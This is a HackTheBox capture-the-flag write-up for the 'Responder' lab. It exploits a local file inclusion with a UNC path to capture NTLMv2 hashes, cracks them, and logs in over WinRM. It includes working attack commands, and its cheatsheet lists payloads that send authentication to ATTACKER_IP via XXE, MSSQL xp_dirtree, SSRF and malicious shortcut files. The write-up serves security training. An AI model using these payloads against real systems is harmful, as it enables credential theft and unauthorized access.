# Responder - HTB Starting Point

## Info
| Property | Value |
|----------|-------|
| Platform | HackTheBox Starting Point |
| Difficulty | Very Easy |
| OS | Windows |
| IP | 10.129.36.24 |
| Date | 2026-03-05 |
| Status | ✅ Completed |

---

## Key Concepts Learned

### What is NTLM?

NTLM (NT LAN Manager) is a **Windows authentication protocol**. Instead of sending passwords over the network, it uses a challenge-response mechanism:

```
1. Client: "I want to login as Administrator"
2. Server: "Prove it. Here's a random challenge: ABC123"
3. Client: Encrypts challenge with password hash → sends response
4. Server: Verifies response → "OK, authenticated"
```

**Key point:** The password hash is used to encrypt the challenge. If we capture this exchange, we can crack it offline.

### What is Responder?

Responder is a tool that **pretends to be various Windows services** (SMB, HTTP, FTP, etc.) to capture authentication attempts.

When a Windows machine tries to connect to a share like `\\attacker_ip\share`:
1. Windows automatically sends NTLM credentials
2. Responder captures the NTLMv2 hash
3. We crack it offline

### Why Does This Work?

Windows has a feature where **UNC paths** (like `\\server\share`) trigger automatic NTLM authentication. If we can force a Windows server to connect to our machine, it will send us its hash!

---

## Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -oA nmap/responder 10.129.36.24
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 80 | HTTP | Apache/2.4.52 (Win64) PHP/8.1.1 |
| 5985 | WinRM | Microsoft HTTPAPI |

### Web Enumeration

Visiting `http://10.129.36.24` redirects to `http://unika.htb/`

**Add to /etc/hosts:**
```bash
echo "10.129.36.24    unika.htb" | sudo tee -a /etc/hosts
```

### Finding LFI

The page parameter is vulnerable to LFI:
```bash
curl "http://unika.htb/index.php?page=../../../../windows/system32/drivers/etc/hosts"
```

---

## Exploitation

### The Attack Chain

```
LFI → Include UNC path → Windows connects to our IP → NTLM hash captured → Crack → WinRM login
```

### Step 1: Start Responder

```bash
sudo responder -I tun0
```

**Keep this terminal open!**

Responder will listen for incoming authentication attempts.

### Step 2: Get Your IP

```bash
ip a show tun0 | grep inet
# Example: 10.10.15.50
```

### Step 3: Trigger NTLM Authentication via LFI

Use the LFI vulnerability to make the server connect to YOUR machine:

```bash
curl "http://unika.htb/index.php?page=//10.10.15.50/anything/whatever"
```

**Replace `10.10.15.50` with your actual tun0 IP!**

**What happens:**
1. PHP tries to include file from `//YOUR_IP/anything/whatever`
2. Windows sees UNC path → connects to your IP
3. Windows sends NTLM authentication (automatic!)
4. Responder captures the hash

**The filename doesn't matter** - it can be anything. The file doesn't need to exist.

### Step 4: Capture the Hash

Responder output shows:
```
[SMB] NTLMv2-SSP Client   : 10.129.36.24
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:1a2b3c4d5e6f...
```

**Copy the entire hash line** (starting from `Administrator::...`)

Hashes are also saved to:
```bash
/usr/share/responder/logs/
```

### Step 5: Crack the Hash

Save hash to file:
```bash
echo 'Administrator::RESPONDER:1a2b3c4d5e6f...' > hash.txt
```

**Crack with Hashcat:**
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Or with John:**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

| Hash Mode | Type |
|-----------|------|
| 5600 | NTLMv2 |
| 1000 | NTLM (NT hash) |
| 5500 | NTLMv1 |

### Step 6: Login via WinRM

```bash
evil-winrm -i 10.129.136.91 -u administrator -p badminton
```

**Cracked password:** `badminton`

**WinRM (port 5985)** allows remote PowerShell access on Windows.

---

## Post-Exploitation

### Get Flag
```powershell
cd C:\Users\mike\Desktop
type flag.txt
```

**Flag:** `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`

---

## NTLM & Responder Cheatsheet

### Responder Commands
```bash
# Start Responder
sudo responder -I tun0

# With analysis mode (don't capture, just analyze)
sudo responder -I tun0 -A

# Check logs
ls /usr/share/responder/logs/
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt
```

### Ways to Trigger NTLM Authentication

| Method | Example |
|--------|---------|
| LFI with UNC path | `page=//ATTACKER_IP/share/file` |
| XXE | `<!ENTITY xxe SYSTEM "file://ATTACKER_IP/share">` |
| SSRF | Force server to request `\\ATTACKER_IP\share` |
| SQL Injection (MSSQL) | `EXEC xp_dirtree '\\ATTACKER_IP\share'` |
| Malicious file | `.lnk`, `.scf`, `.url` files pointing to attacker |

### Cracking NTLM Hashes

| Tool | Command |
|------|---------|
| Hashcat | `hashcat -m 5600 hash.txt wordlist.txt` |
| John | `john --wordlist=wordlist.txt hash.txt` |

### NTLMv2 Hash Format
```
Username::Domain:ServerChallenge:NTProofStr:NTLMv2Response
```

Example:
```
Administrator::RESPONDER:1a2b3c4d5e6f7890:aabbccdd...:112233...
```

---

## Lessons Learned

- **LFI can do more than read files** - can trigger NTLM auth via UNC paths
- **Windows auto-authenticates to UNC paths** - major security risk
- **Responder captures hashes passively** - just needs traffic to your IP
- **NTLMv2 is crackable** - offline cracking with wordlists
- **WinRM is like SSH for Windows** - port 5985, use evil-winrm

---

## Related Techniques

- [[Pass-the-Hash]] - Use hash without cracking
- [[NTLM Relay]] - Forward auth to another server
- [[SMB Attacks]] - Other SMB exploitation methods

---

**Tags:** #htb #windows #responder #ntlm #lfi #winrm #starting-point
